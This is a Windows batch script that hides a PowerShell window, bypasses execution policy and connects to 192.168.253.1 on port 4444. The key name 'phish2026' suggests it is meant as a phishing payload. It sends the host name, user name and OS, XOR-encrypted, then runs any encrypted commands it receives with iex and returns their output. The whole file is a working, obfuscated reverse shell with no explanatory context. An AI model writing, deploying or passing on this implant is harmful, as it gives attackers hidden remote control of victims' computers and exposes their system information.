@echo off
powershell -WindowStyle Hidden -Exec Bypass -Command "$h='192.168.253.1';$pt=4444;$k='phish2026';function x($b,$kk){$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=$b[$i]-bxor$kk[$i%$kk.Length]};return [byte[]]$r};$info=$env:COMPUTERNAME+'|'+$env:USERNAME+'|'+$env:OS;$kb=[Text.Encoding]::UTF8.GetBytes($info);try{$c=New-Object Net.Sockets.TcpClient($h,$pt);$s=$c.GetStream();$enc=x $kb ([Text.Encoding]::UTF8.GetBytes($k));$s.Write($enc,0,$enc.Length);$s.Flush();while($c.Connected){Start-Sleep 10;try{$buf=New-Object byte[] 4096;$n=$s.Read($buf,0,4096);if($n-gt0){$cmd=[Text.Encoding]::UTF8.GetString(x $buf[0..($n-1)] ([Text.Encoding]::UTF8.GetBytes($k)));$out=iex $cmd 2>&1|Out-String;$ob=[Text.Encoding]::UTF8.GetBytes($out);$oe=x $ob ([Text.Encoding]::UTF8.GetBytes($k));$s.Write($oe,0,$oe.Length);$s.Flush()}}catch{break}}$c.Close()}catch{}"
